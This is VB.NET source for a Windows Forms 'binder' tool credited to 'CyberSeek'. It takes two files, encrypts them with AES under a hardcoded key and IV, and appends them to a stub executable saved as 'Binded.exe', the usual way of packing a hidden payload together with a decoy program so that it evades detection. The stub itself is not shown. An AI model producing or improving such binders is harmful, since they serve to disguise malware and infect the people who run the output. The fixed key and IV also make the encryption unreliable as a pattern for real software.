Public Class Form1
    Dim F, F2 As String
    Function Secure(ByVal data As Byte()) As Byte()
        Using sa As New System.Security.Cryptography.RijndaelManaged
            sa.IV = New Byte() {1, 2, 3, 4, 5, 6, 7, 8, 9, 1, 2, 3, 4, 5, 6, 7}
            sa.Key = New Byte() {7, 6, 5, 4, 3, 2, 1, 9, 8, 7, 6, 5, 4, 3, 2, 1}
            Return sa.CreateEncryptor.TransformFinalBlock(data, 0, data.Length)
        End Using
    End Function
    Function UnSecure(ByVal data As Byte()) As Byte()
        Using sa As New System.Security.Cryptography.RijndaelManaged
            sa.IV = New Byte() {1, 2, 3, 4, 5, 6, 7, 8, 9, 1, 2, 3, 4, 5, 6, 7}
            sa.Key = New Byte() {7, 6, 5, 4, 3, 2, 1, 9, 8, 7, 6, 5, 4, 3, 2, 1}
            Return sa.CreateDecryptor.TransformFinalBlock(data, 0, data.Length)
        End Using
    End Function

    Private Sub Button5_Click(ByVal sender As System.Object, ByVal e As System.EventArgs) Handles Button5.Click
        Me.Close()
    End Sub

    Private Sub Button4_Click(ByVal sender As System.Object, ByVal e As System.EventArgs) Handles Button4.Click
        MsgBox("This Binder Coded By CyberSeek", vbInformation, "About")
    End Sub

    Private Sub Button1_Click(ByVal sender As System.Object, ByVal e As System.EventArgs) Handles Button1.Click
        TextBox1.Clear()
        Dim ofd As New OpenFileDialog
        With ofd
            .FileName = "*.*"
            .Title = "Choose a File..."
            .Filter = "All Files (*.*) |*.*"
            .InitialDirectory = Environment.GetFolderPath(Environment.SpecialFolder.Desktop)
            If .ShowDialog = Windows.Forms.DialogResult.OK Then
                F = .SafeFileName
                TextBox1.Text = .FileName
            End If
        End With
    End Sub

    Private Sub Button2_Click(ByVal sender As System.Object, ByVal e As System.EventArgs) Handles Button2.Click
        TextBox2.Clear()
        Dim ofd As New OpenFileDialog
        With ofd
            .FileName = "*.*"
            .Title = "Choose a File..."
            .Filter = "All Files (*.*) |*.*"
            .InitialDirectory = Environment.GetFolderPath(Environment.SpecialFolder.Desktop)
            If .ShowDialog = Windows.Forms.DialogResult.OK Then
                F2 = .SafeFileName
                TextBox2.Text = .FileName
            End If
        End With
    End Sub

    Private Sub Button3_Click(ByVal sender As System.Object, ByVal e As System.EventArgs) Handles Button3.Click
        Try
            Dim sfd As New SaveFileDialog
            With sfd
                .FileName = "Binded.exe"
                .Title = "Choose An Output Folder..."
                .Filter = "Exe Files | *.exe"
                .InitialDirectory = Environment.GetFolderPath(Environment.SpecialFolder.Desktop)
                If .ShowDialog = Windows.Forms.DialogResult.OK Then
                    Dim sp As String = "[SPLITTER]"
                    Dim buffer As Byte() = My.Resources.Stub
                    My.Computer.FileSystem.WriteAllBytes(.FileName, buffer, False)
                    Dim File1 As Byte() = Secure(My.Computer.FileSystem.ReadAllBytes(TextBox1.Text))
                    Dim File2 As Byte() = Secure(My.Computer.FileSystem.ReadAllBytes(TextBox2.Text))
                    System.IO.File.AppendAllText(.FileName, sp & Convert.ToBase64String(File1) & sp & F & sp & Convert.ToBase64String(File2) & sp & F2)
                    MsgBox("SuccessFully Binded!", MsgBoxStyle.Information + MsgBoxStyle.OkOnly, "Success")
                    TextBox1.Clear()
                    TextBox2.Clear()
                End If
            End With
        Catch ex As Exception
            MsgBox("Error(s) occured" & ex.Message, MsgBoxStyle.Critical, "Error")


        End Try

    End Sub

    Private Sub Form1_Load(ByVal sender As System.Object, ByVal e As System.EventArgs) Handles MyBase.Load

    End Sub
End Class
